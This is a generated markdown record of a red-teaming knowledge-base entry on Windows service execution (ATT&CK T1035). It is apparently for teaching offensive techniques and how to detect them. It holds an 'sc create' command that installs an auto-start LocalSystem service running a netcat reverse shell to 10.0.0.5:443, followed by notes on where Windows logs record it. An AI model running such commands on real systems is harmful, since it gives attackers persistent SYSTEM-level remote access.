---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Service Execution

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1035-service-execution` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1035-service-execution.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Creating an evil service with a netcat reverse shell:

## Preserved Body

````markdown
## Execution

Creating an evil service with a netcat reverse shell:
```csharp
C:\> sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
[SC] CreateService SUCCESS
C:\> sc start evilsvc
```
## Observations

The reverse shell lives under services.exe as expected:

![](<../../_assets/services-nc.png>)

Windows security, application, Service Control Manager and sysmon logs provide some juicy details:

![](<../../_assets/services-logs.png>)

![](<../../_assets/services-shell.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/service-execution.md)

## Evidence Excerpt

```text
_asset_filenames:
- services-logs.png
- services-nc.png
- services-shell.png
_body: '---
description: ''Code Execution, Privilege Escalation''
---
# Service Execution
```
